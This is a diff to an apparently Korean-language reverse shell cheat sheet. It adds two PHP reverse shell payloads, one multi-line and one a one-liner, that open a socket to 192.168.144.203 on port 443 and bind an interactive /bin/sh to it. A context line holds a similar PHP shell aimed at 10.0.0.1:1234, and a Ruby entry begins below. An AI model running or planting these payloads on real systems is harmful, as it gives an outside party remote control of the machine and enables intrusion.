@@ -34,6 +34,19 @@
     php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
     ```
 
+    ```php
+    <?php
+    $ip = '192.168.144.203';
+    $port = 443;
+    $sock = fsockopen($ip, $port);
+    $proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+    ?>
+    ```
+
+    ```php
+    <?php $s=fsockopen("192.168.144.203",443);proc_open("/bin/sh -i", [0=>$s,1=>$s,2=>$s],$p); ?>
+    ```
+
 ### 5\. Ruby
 
   * **설명:** `TCPSocket`을 열어 파일 기술자를 얻은 후, `sprintf`를 사용하여 셸 실행 시 입출력을 해당 기술자로 지정합니다.
